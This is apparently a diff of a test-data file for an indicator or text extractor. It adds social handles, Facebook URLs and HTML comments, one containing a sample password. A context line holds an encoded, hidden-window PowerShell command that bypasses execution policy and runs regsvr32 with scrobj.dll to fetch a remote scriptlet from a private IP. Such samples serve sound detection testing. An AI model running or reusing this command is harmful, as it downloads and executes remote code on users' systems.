@@ -124,3 +124,9 @@ CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N/E:U/RL:O/RC:U/CR:L/IR:L/AR:L/MAV:N/
 CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
 powerShell.exe -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA4AC4AMQAyADkALwB0AGUAcwB0AC4AagBwAGcAIABzAGMAcgBvAGIAagAuAGQAbABsAAoA
 cmd.exe \c "echo 'Hello, world'"
+@myaftha
+@neiltyson
+<!-- This is an HTML comment -->
+<!-- Hey, A Password in an HTML comment, Password: StrongPassword!1!1 -->
+http://www.facebook.com/my_page_id
+http://www.facebook.com/pages/Vanity-Url/45678
